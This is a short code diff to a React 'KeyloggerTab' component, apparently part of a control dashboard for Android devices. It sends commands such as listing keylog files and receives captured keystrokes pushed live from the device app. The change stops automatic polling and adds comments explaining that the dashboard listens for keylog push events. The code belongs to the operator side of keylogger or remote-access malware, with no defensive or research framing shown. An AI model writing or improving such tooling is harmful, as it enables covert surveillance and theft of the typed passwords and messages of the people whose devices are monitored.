@@ -89,9 +89,11 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
     sendCommand(deviceId, 'list_keylog_files', {});
   }, [deviceId, sendCommand]);
 
+  // Keylogs arrive via push events (keylog:push) from the Android app in real time.
+  // The dashboard does not poll get_keylogs automatically — it only listens.
+  // File listing is loaded for the Files tab when the device comes online.
   useEffect(() => {
     if (isOnline) {
-      fetchLiveLogs();
       fetchFiles();
     }
   }, [isOnline]);
